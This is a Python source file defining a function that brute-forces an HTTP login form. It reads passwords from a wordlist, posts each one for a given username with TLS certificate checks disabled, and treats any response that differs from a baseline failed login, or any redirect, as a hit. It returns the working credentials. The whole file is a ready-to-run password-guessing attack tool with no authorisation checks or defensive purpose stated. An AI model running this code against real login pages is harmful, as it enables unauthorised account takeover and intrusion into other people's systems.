import requests
import urllib3
from rich.console import Console

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()


def http_brute(url, username, wordlist, user_field="username",
               pass_field="password", fail_text=None, timeout=5):
    """
    Brute force HTTP login form.
    Returns {"username": str, "password": str} or None
    """
    try:
        with open(wordlist, "r", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        console.print(f"[red]❌ Wordlist not found: {wordlist}[/red]")
        return None

    console.print(f"[cyan]Target   : {url}[/cyan]")
    console.print(f"[cyan]Username : {username}[/cyan]")
    console.print(f"[cyan]Fields   : {user_field} / {pass_field}[/cyan]")
    console.print(f"[cyan]Wordlist : {wordlist} ({len(passwords)} passwords)[/cyan]\n")

    # Get baseline response for failed login
    if not fail_text:
        try:
            baseline = requests.post(
                url,
                data={user_field: username, pass_field: "wrongpassword_xyz"},
                timeout=timeout,
                verify=False
            )
            fail_text = baseline.text[:200]
        except Exception:
            fail_text = "invalid"

    for i, password in enumerate(passwords, 1):
        try:
            response = requests.post(
                url,
                data={user_field: username, pass_field: password},
                timeout=timeout,
                verify=False,
                allow_redirects=True
            )

            # Success detection: response differs from failed baseline
            if fail_text.lower() not in response.text.lower() or response.status_code == 302:
                return {"username": username, "password": password, "attempts": i}

            console.print(f"[dim]  [{i}] {password} — Failed[/dim]")

        except Exception:
            continue

    return None
